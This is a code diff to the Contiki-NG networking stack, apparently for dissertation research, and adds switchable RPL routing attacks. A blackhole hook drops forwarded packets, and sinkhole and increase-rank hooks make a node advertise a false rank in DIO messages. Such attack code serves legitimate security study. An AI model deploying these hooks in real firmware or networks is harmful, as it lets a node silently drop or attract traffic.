@@ -1,0 +1,109 @@
+diff --git a/examples/rpl-udp/Makefile b/examples/rpl-udp/Makefile
+index 78e6d1653..a82f727bf 100644
+--- a/examples/rpl-udp/Makefile
++++ b/examples/rpl-udp/Makefile
+@@ -1,4 +1,4 @@
+-CONTIKI_PROJECT = udp-client udp-server
++CONTIKI_PROJECT = udp-client udp-server blackhole-node blackhole-client
+ all: $(CONTIKI_PROJECT)
+ 
+ CONTIKI=../..
+diff --git a/os/net/ipv6/uip6.c b/os/net/ipv6/uip6.c
+index 57416fc9e..c41e11398 100644
+--- a/os/net/ipv6/uip6.c
++++ b/os/net/ipv6/uip6.c
+@@ -88,7 +88,10 @@
+ /* Log configuration */
+ #include "sys/log.h"
+ #define LOG_MODULE "IPv6"
+-#define LOG_LEVEL LOG_LEVEL_IPV6
++#define LOG_LEVEL LOG_LEVEL_WARN
++
++/* Dissertation blackhole hook. Default is OFF. */
++int blackhole_attack_enabled __attribute__((weak)) = 0;
+ 
+ #if UIP_STATISTICS == 1
+ struct uip_stats uip_stat;
+@@ -1296,6 +1299,13 @@ uip_process(uint8_t flag)
+         goto send;
+       }
+ 
++      if(blackhole_attack_enabled) {
++        LOG_WARN("BLACKHOLE: forward check hit\n");
++        LOG_WARN("BLACKHOLE: dropping forwarded packet\n");
++        UIP_STAT(++uip_stat.ip.drop);
++        goto drop;
++      }
++
+       LOG_INFO("Forwarding packet to next hop, dest: ");
+       LOG_INFO_6ADDR(&UIP_IP_BUF->destipaddr);
+       LOG_INFO_("\n");
+diff --git a/os/net/routing/rpl-lite/rpl-icmp6.c b/os/net/routing/rpl-lite/rpl-icmp6.c
+index 160181275..96a8e0444 100644
+--- a/os/net/routing/rpl-lite/rpl-icmp6.c
++++ b/os/net/routing/rpl-lite/rpl-icmp6.c
+@@ -57,6 +57,10 @@
+ #define LOG_MODULE "RPL"
+ #define LOG_LEVEL LOG_LEVEL_RPL
+ 
++/* Routing-attack hooks: disabled for normal firmware */
++int increase_rank_attack_enabled __attribute__((weak)) = 0;
++int sinkhole_attack_enabled __attribute__((weak)) = 0;
++
+ /*---------------------------------------------------------------------------*/
+ #define RPL_DIO_GROUNDED                 0x80
+ #define RPL_DIO_MOP_SHIFT                3
+@@ -359,6 +363,7 @@ rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
+ {
+   unsigned char *buffer;
+   int pos;
++  uint16_t advertised_rank;
+   uip_ipaddr_t *addr = uc_addr;
+ 
+   /* Make sure we're up-to-date before sending data out */
+@@ -380,8 +385,34 @@ rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
+   buffer[pos++] = curr_instance.instance_id;
+   buffer[pos++] = curr_instance.dag.version;
+ 
+-  set16(buffer, pos,
+-        rpl_get_leaf_only() ? RPL_INFINITE_RANK : curr_instance.dag.rank);
++  advertised_rank = rpl_get_leaf_only()
++                    ? RPL_INFINITE_RANK
++                    : curr_instance.dag.rank;
++
++  if(sinkhole_attack_enabled && !rpl_get_leaf_only()) {
++    /*
++     * Sinkhole behaviour: advertise a root-level rank while retaining
++     * the node's real internal rank. This attracts neighbouring nodes
++     * without changing the local DODAG state.
++     */
++    advertised_rank = RPL_MIN_HOPRANKINC;
++
++    LOG_WARN("SINKHOLE: advertising rank %u instead of %u\n",
++             (unsigned)advertised_rank,
++             (unsigned)curr_instance.dag.rank);
++  } else if(increase_rank_attack_enabled && !rpl_get_leaf_only()) {
++    /*
++     * Advertise an extremely high but finite rank.
++     * The node's real internal rank remains unchanged.
++     */
++    advertised_rank = RPL_INFINITE_RANK - 1;
++
++    LOG_WARN("INCREASE_RANK: advertising rank %u instead of %u\n",
++             (unsigned)advertised_rank,
++             (unsigned)curr_instance.dag.rank);
++  }
++
++  set16(buffer, pos, advertised_rank);
+   pos += 2;
+ 
+   buffer[pos] = curr_instance.dag.grounded ? RPL_DIO_GROUNDED : 0;
+@@ -463,7 +494,7 @@ rpl_icmp6_dio_output(uip_ipaddr_t *uc_addr)
+ 
+   LOG_INFO("sending a %s-DIO with rank %u to ",
+          uc_addr != NULL ? "unicast" : "multicast",
+-         (unsigned)curr_instance.dag.rank);
++         (unsigned)advertised_rank);
+   LOG_INFO_6ADDR(addr);
+   LOG_INFO_("\n");
+ 
